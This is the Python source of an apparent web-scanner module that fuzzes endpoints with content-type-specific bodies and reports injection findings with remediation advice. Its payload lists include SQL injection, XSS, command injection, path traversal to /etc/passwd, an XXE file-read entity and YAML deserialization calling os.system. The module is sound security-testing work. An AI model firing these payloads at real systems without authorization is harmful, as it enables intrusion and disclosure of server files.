"""
Content-type-aware body fuzzing — extend fuzzing beyond JSON/form
to GraphQL, Protobuf (text), SOAP/XML envelopes, and multipart.

CWE-20: Improper Input Validation
"""

from __future__ import annotations

import json
import logging
import secrets
from dataclasses import dataclass, field
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger(__name__)


# ------------------------------------------------------------------
# Content-type profiles
# ------------------------------------------------------------------

@dataclass
class ContentTypeProfile:
    """Defines how to craft a body for a specific content-type."""
    name: str
    content_type: str
    wrap: str  # f-string template with {payload} placeholder
    detection_hints: List[str] = field(default_factory=list)


_PROFILES: List[ContentTypeProfile] = [
    ContentTypeProfile(
        name="graphql",
        content_type="application/json",
        wrap='{{"query":"mutation {{ createItem(input: {{name: \\"{payload}\\"}}) {{ id }} }}"}}',
        detection_hints=["/graphql", "/gql", "/query"],
    ),
    ContentTypeProfile(
        name="soap-xml",
        content_type="text/xml; charset=utf-8",
        wrap=(
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soap:Body><Request><Input>{payload}</Input></Request></soap:Body>'
            '</soap:Envelope>'
        ),
        detection_hints=["/soap", "/ws", "/service", ".asmx", ".svc"],
    ),
    ContentTypeProfile(
        name="soap12-xml",
        content_type="application/soap+xml; charset=utf-8",
        wrap=(
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
            '<soap:Body><Request><Input>{payload}</Input></Request></soap:Body>'
            '</soap:Envelope>'
        ),
        detection_hints=["/soap", "/ws", "/service"],
    ),
    ContentTypeProfile(
        name="xml-rpc",
        content_type="text/xml",
        wrap=(
            '<?xml version="1.0"?>'
            '<methodCall><methodName>system.listMethods</methodName>'
            '<params><param><value><string>{payload}</string></value></param></params>'
            '</methodCall>'
        ),
        detection_hints=["/xmlrpc", "/rpc", "/xml-rpc"],
    ),
    ContentTypeProfile(
        name="plain-xml",
        content_type="application/xml",
        wrap='<?xml version="1.0"?><root><data>{payload}</data></root>',
        detection_hints=[],
    ),
    ContentTypeProfile(
        name="multipart",
        content_type="multipart/form-data; boundary=----GKBoundary",
        wrap=(
            '------GKBoundary\r\n'
            'Content-Disposition: form-data; name="input"\r\n\r\n'
            '{payload}\r\n'
            '------GKBoundary--\r\n'
        ),
        detection_hints=["/upload", "/import", "/file"],
    ),
    ContentTypeProfile(
        name="yaml",
        content_type="application/x-yaml",
        wrap="input: {payload}\n",
        detection_hints=["/config", "/settings", "/yaml"],
    ),
    ContentTypeProfile(
        name="csv",
        content_type="text/csv",
        wrap="id,name\r\n1,{payload}\r\n",
        detection_hints=["/import", "/csv", "/upload"],
    ),
    ContentTypeProfile(
        name="msgpack-like",
        content_type="application/msgpack",
        wrap='{{"input":"{payload}"}}',
        detection_hints=["/api"],
    ),
]


# ------------------------------------------------------------------
# Injection payloads per content-type
# ------------------------------------------------------------------

_GENERIC_PAYLOADS = [
    ("sqli", "' OR 1=1--"),
    ("xss", "<script>alert(1)</script>"),
    ("ssti", "{{7*7}}"),
    ("cmdi", "; id"),
    ("xxe-ref", "&xxe;"),
    ("path-traversal", "../../../../etc/passwd"),
]

_SOAP_PAYLOADS = [
    ("xxe-external", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'),
    ("soap-header-inject", '</Input></Request></soap:Body><soap:Body><Evil>1</Evil>'),
    ("cdata-escape", "<![CDATA[<script>alert(1)</script>]]>"),
]

_YAML_PAYLOADS = [
    ("yaml-anchor-bomb", "&a ['lol','lol','lol','lol','lol']"),
    ("yaml-python-exec", "!!python/object/apply:os.system ['id']"),
    ("yaml-tag-inject", "!ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList type: :runtime"),
]


class ContentTypeAwareFuzzer:
    """
    Fuzzes endpoints with content-type-specific payloads,
    detecting parser confusion and content-type-dependent vulns.
    """

    def __init__(self, http_client: Optional[HttpClient] = None) -> None:
        self._client = http_client
        self._owns_client = http_client is not None

    async def check(self, target: Target) -> List[Finding]:
        """Run content-type-aware fuzzing against *target*."""
        client = self._client
        if client is None:
            return []

        findings: List[Finding] = []
        url = target.url
        method = (target.method or "POST").upper()

        if method not in ("POST", "PUT", "PATCH"):
            return []

        # Detect which profiles match this endpoint
        profiles = self._select_profiles(url)

        for profile in profiles:
            findings.extend(
                await self._fuzz_with_profile(client, url, method, target, profile)
            )

        # Always try content-type confusion (send XML to JSON endpoint, etc.)
        findings.extend(await self._test_content_type_confusion(client, url, method, target))

        return findings

    def _select_profiles(self, url: str) -> List[ContentTypeProfile]:
        """Select profiles based on URL hints, always include generic ones."""
        matched: List[ContentTypeProfile] = []
        url_lower = url.lower()

        for profile in _PROFILES:
            if not profile.detection_hints:
                # Always include profiles without specific hints (plain-xml, multipart)
                matched.append(profile)
                continue
            if any(hint in url_lower for hint in profile.detection_hints):
                matched.append(profile)

        # Always include SOAP and GraphQL as they're common
        names = {p.name for p in matched}
        for profile in _PROFILES:
            if profile.name in ("soap-xml", "graphql") and profile.name not in names:
                matched.append(profile)

        return matched

    async def _fuzz_with_profile(
        self,
        client: HttpClient,
        url: str,
        method: str,
        target: Target,
        profile: ContentTypeProfile,
    ) -> List[Finding]:
        """Send content-type-specific payloads."""
        findings: List[Finding] = []
        canary = secrets.token_hex(6)

        # Choose payloads based on profile type
        payloads = list(_GENERIC_PAYLOADS)
        if "xml" in profile.name or "soap" in profile.name:
            payloads.extend(_SOAP_PAYLOADS)
        if profile.name == "yaml":
            payloads.extend(_YAML_PAYLOADS)

        for payload_name, payload_value in payloads:
            tagged_payload = f"{canary}{payload_value}"
            try:
                body = profile.wrap.format(payload=tagged_payload)
            except (KeyError, IndexError):
                continue

            try:
                resp = await client.request(
                    method, url,
                    body=body.encode("utf-8", errors="replace"),
                    headers={"Content-Type": profile.content_type},
                )

                if resp.status_code not in range(200, 500):
                    continue

                text = resp.text

                # Check for canary reflection (indicates processing)
                if canary in text:
                    # Check for signs of successful injection
                    indicators = self._check_injection_indicators(text, payload_name)
                    if indicators:
                        findings.append(Finding(
                            title=f"{profile.name} {payload_name} injection ({profile.content_type})",
                            description=(
                                f"Payload was processed via {profile.content_type} content-type "
                                f"and injection indicators were detected: {', '.join(indicators)}."
                            ),
                            severity=Severity.HIGH,
                            target=target,
                            evidence=(
                                f"Content-Type: {profile.content_type}\n"
                                f"Payload: {payload_name}\n"
                                f"Indicators: {indicators}\n"
                                f"Status: {resp.status_code}"
                            ),
                            remediation=(
                                f"Validate and sanitize input for {profile.name} content-type. "
                                f"Use parameterized queries and context-aware output encoding."
                            ),
                            cwe=20,
                            tags=["content-type-fuzzing", profile.name, payload_name, "grotassault"],
                        ))
                        break  # One finding per profile

                # Check for error messages revealing parser type
                if resp.status_code >= 400:
                    parser_leak = self._detect_parser_leak(text, profile)
                    if parser_leak:
                        findings.append(Finding(
                            title=f"Parser error disclosure via {profile.content_type}",
                            description=(
                                f"Error response reveals parser information: {parser_leak}. "
                                f"This helps attackers craft targeted payloads."
                            ),
                            severity=Severity.LOW,
                            target=target,
                            evidence=f"Content-Type: {profile.content_type}\nParser leak: {parser_leak}",
                            remediation="Return generic error messages; do not expose parser details.",
                            cwe=209,
                            tags=["content-type-fuzzing", "info-disclosure", "grotassault"],
                        ))

            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    async def _test_content_type_confusion(
        self,
        client: HttpClient,
        url: str,
        method: str,
        target: Target,
    ) -> List[Finding]:
        """
        Send body with mismatched Content-Type to detect parser confusion.
        E.g., send XML body with application/json header.
        """
        findings: List[Finding] = []
        canary = secrets.token_hex(6)

        confusion_tests = [
            # (send_content_type, actual_body_format, body)
            (
                "application/json",
                "xml",
                f'<?xml version="1.0"?><root><data>{canary}</data></root>',
            ),
            (
                "application/xml",
                "json",
                f'{{"data":"{canary}"}}',
            ),
            (
                "application/x-www-form-urlencoded",
                "json",
                f'{{"data":"{canary}"}}',
            ),
            (
                "text/plain",
                "json",
                f'{{"data":"{canary}"}}',
            ),
        ]

        for declared_ct, actual_format, body in confusion_tests:
            try:
                resp = await client.request(
                    method, url,
                    body=body.encode("utf-8"),
                    headers={"Content-Type": declared_ct},
                )

                if resp.status_code in (200, 201) and canary in resp.text:
                    findings.append(Finding(
                        title=f"Content-type confusion: declared {declared_ct}, sent {actual_format}",
                        description=(
                            f"Server processed a {actual_format} body despite "
                            f"Content-Type being declared as '{declared_ct}'. "
                            f"Parser confusion can bypass WAFs and validation."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"Declared: {declared_ct}\n"
                            f"Actual body format: {actual_format}\n"
                            f"Canary reflected: True"
                        ),
                        remediation=(
                            "Strictly enforce Content-Type matching. Reject requests "
                            "where the body format doesn't match the declared Content-Type."
                        ),
                        cwe=20,
                        tags=["content-type-confusion", "parser-confusion", "grotassault"],
                    ))
                    break  # One confusion finding is enough

            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    # ----------------------------------------------------------
    # Helpers
    # ----------------------------------------------------------

    @staticmethod
    def _check_injection_indicators(text: str, payload_name: str) -> List[str]:
        """Look for signs that injection was successful."""
        indicators: List[str] = []
        text_lower = text.lower()

        if payload_name == "sqli":
            sql_errors = ["syntax error", "sql", "mysql", "postgresql", "sqlite", "oracle"]
            if any(e in text_lower for e in sql_errors):
                indicators.append("SQL error in response")

        elif payload_name == "xss":
            if "<script>alert(1)</script>" in text:
                indicators.append("XSS payload reflected unescaped")
            elif "alert(1)" in text:
                indicators.append("Script content reflected")

        elif payload_name == "ssti":
            if "49" in text:  # 7*7
                indicators.append("SSTI expression evaluated (49)")

        elif payload_name == "cmdi":
            if "uid=" in text_lower or "root:" in text_lower:
                indicators.append("Command output detected")

        elif payload_name == "xxe-ref":
            if "root:" in text or "passwd" in text_lower:
                indicators.append("XXE entity resolved")

        elif payload_name == "path-traversal":
            if "root:" in text or "[extensions]" in text_lower:
                indicators.append("File content in response")

        return indicators

    @staticmethod
    def _detect_parser_leak(text: str, profile: ContentTypeProfile) -> Optional[str]:
        """Detect parser identity from error messages."""
        text_lower = text.lower()
        parser_hints = {
            "lxml": "lxml parser",
            "expat": "Expat XML parser",
            "saxparser": "SAX parser",
            "jackson": "Jackson JSON parser",
            "gson": "Gson JSON parser",
            "newtonsoft": "Newtonsoft.Json",
            "system.xml": ".NET System.Xml",
            "javax.xml": "Java javax.xml",
            "yaml.scanner": "PyYAML scanner",
            "ruamel": "ruamel.yaml",
            "snakeyaml": "SnakeYAML",
            "xmlparser": "XML parser",
        }

        for hint, name in parser_hints.items():
            if hint in text_lower:
                return name

        return None
